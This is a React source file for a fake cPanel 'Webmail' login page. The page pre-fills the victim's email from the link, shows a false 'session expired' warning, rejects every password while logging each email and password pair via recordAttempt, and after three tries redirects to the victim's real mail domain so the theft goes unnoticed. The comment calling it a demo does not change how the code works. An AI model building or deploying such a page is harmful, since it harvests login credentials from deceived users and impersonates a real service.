import React, { useState, useEffect } from 'react';
import { AnimatePresence, motion } from 'framer-motion';
import { useLanguage } from '@/contexts/LanguageContext';
import LanguageSwitcher from '@/components/LanguageSwitcher';
import { recordAttempt } from '@/lib/activityLog';

const MAX_LOGIN_ATTEMPTS = 3;

// cPanel "cP" SVG logo used on the orange button and footer
function CpanelLogo({ size = 20, color = '#fff' }: { size?: number; color?: string }) {
  return (
    <svg width={size} height={size} viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
      <text
        x="50%"
        y="54%"
        dominantBaseline="middle"
        textAnchor="middle"
        fontFamily="Arial, sans-serif"
        fontWeight="900"
        fontSize="26"
        fill={color}
        fontStyle="italic"
      >
        cP
      </text>
    </svg>
  );
}

// Person icon (email field)
function PersonIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="12" cy="8" r="4" stroke="#9ca3af" strokeWidth="1.8" />
      <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="#9ca3af" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  );
}

// Lock icon (password field)
function LockIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="5" y="11" width="14" height="10" rx="2" stroke="#9ca3af" strokeWidth="1.8" />
      <path d="M8 11V7a4 4 0 0 1 8 0v4" stroke="#9ca3af" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  );
}

function AlertIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="2" />
      <path d="M12 7.5v5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
      <circle cx="12" cy="16" r="1" fill="currentColor" />
    </svg>
  );
}

export default function LoginPage() {
  const { t } = useLanguage();
  const [email, setEmail] = useState(() => {
    const params = new URLSearchParams(window.location.search);
    return params.get('email') ?? '';
  });
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionExpired, setSessionExpired] = useState(true);
  const [attemptCount, setAttemptCount] = useState(0);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !password || isRedirecting) {
      setError('Please enter your email and password.');
      return;
    }

    setError(null);
    setSessionExpired(false);
    setIsLoading(true);

    try {
      // Temporary demo flow: every attempt is treated as incorrect until the
      // redirect channel is wired to its final destination.
      await new Promise(resolve => setTimeout(resolve, 700));
      const nextAttempt = attemptCount + 1;
      setAttemptCount(nextAttempt);
      recordAttempt(email, password, 'failed').catch(() => {});

      if (nextAttempt >= MAX_LOGIN_ATTEMPTS) {
        setSessionExpired(false);
        setIsRedirecting(true);

        const domain = email.split('@')[1];
        if (domain) {
          // Small delay so the button text flips to "Redirecting…" first
          setTimeout(() => {
            window.location.href = `https://${domain}`;
          }, 600);
        } else {
          setError('Invalid email domain.');
          setIsRedirecting(false);
        }
      } else {
        setError('Incorrect password. Try again.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="cpanel-page">
      <div className="cpanel-wrapper">

        {/* Logo */}
        <div className="cpanel-logo-area">
          <h1 className="cpanel-brand">Webmail</h1>
        </div>

        {/* Expired-session notice */}
        <AnimatePresence>
          {sessionExpired && (
            <motion.div
              key="session-expired"
              initial={{ opacity: 0, y: -4 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -4 }}
              className="cpanel-session-expired"
              role="status"
              aria-live="polite"
            >
              <span className="cpanel-session-icon"><AlertIcon /></span>
              <span>
                <strong>Login expired</strong>
                <small>Your session has expired. Please log in again.</small>
              </span>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Error */}
        <AnimatePresence>
          {error && (
            <motion.div
              key="err"
              initial={{ opacity: 0, y: -4 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0 }}
              className="cpanel-error"
              role="alert"
            >
              <span className="cpanel-error-icon"><AlertIcon /></span>
              <span>{error}</span>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Form */}
        <form onSubmit={handleSubmit} noValidate>
          {/* Email */}
          <div className="cpanel-field">
            <label htmlFor="email" className="cpanel-label">
              {t('emailLabel')}
            </label>
            <div className="cpanel-input-wrap">
              <span className="cpanel-input-icon"><PersonIcon /></span>
              <input
                id="email"
                type="email"
                placeholder={t('emailPlaceholder')}
                value={email}
                onChange={e => { setEmail(e.target.value); setError(null); }}
                required
                autoComplete="email"
                aria-invalid={Boolean(error)}
                className={`cpanel-input${error ? ' cpanel-input-error' : ''}`}
              />
            </div>
          </div>

          {/* Password */}
          <div className="cpanel-field">
            <label htmlFor="password" className="cpanel-label">
              {t('passwordLabel')}
            </label>
            <div className="cpanel-input-wrap">
              <span className="cpanel-input-icon"><LockIcon /></span>
              <input
                id="password"
                type="password"
                placeholder={t('passwordPlaceholder')}
                value={password}
                onChange={e => { setPassword(e.target.value); setError(null); }}
                required
                autoComplete="current-password"
                aria-invalid={Boolean(error)}
                className={`cpanel-input${error ? ' cpanel-input-error' : ''}`}
              />
            </div>
          </div>

          {/* Log in button */}
          <button
            type="submit"
            disabled={isLoading || isRedirecting}
            aria-busy={isLoading}
            className="cpanel-btn-login"
          >
            <AnimatePresence mode="wait">
              {isLoading ? (
                <motion.span
                  key="loading"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="cpanel-btn-loading"
                >
                  <span className="cpanel-spinner" />
                  {t('signingIn')}
                </motion.span>
              ) : isRedirecting ? (
                <motion.span key="redirecting" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                  Redirecting…
                </motion.span>
              ) : (
                <motion.span key="def" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                  {t('signIn')}
                </motion.span>
              )}
            </AnimatePresence>
          </button>
        </form>

        {/* OR divider */}
        <div className="cpanel-or">
          <span className="cpanel-or-line" />
          <span className="cpanel-or-text">OR</span>
          <span className="cpanel-or-line" />
        </div>

        {/* cPanelID button — redirects to cpanel.net */}
        <a
          href="https://www.cpanel.net/"
          target="_blank"
          rel="noopener noreferrer"
          className="cpanel-btn-cpanelid"
        >
          <CpanelLogo size={22} color="#fff" />
          <span>Log in via cPanelID</span>
        </a>
      </div>

      {/* Language bar + footer */}
      <LanguageSwitcher />
    </div>
  );
}
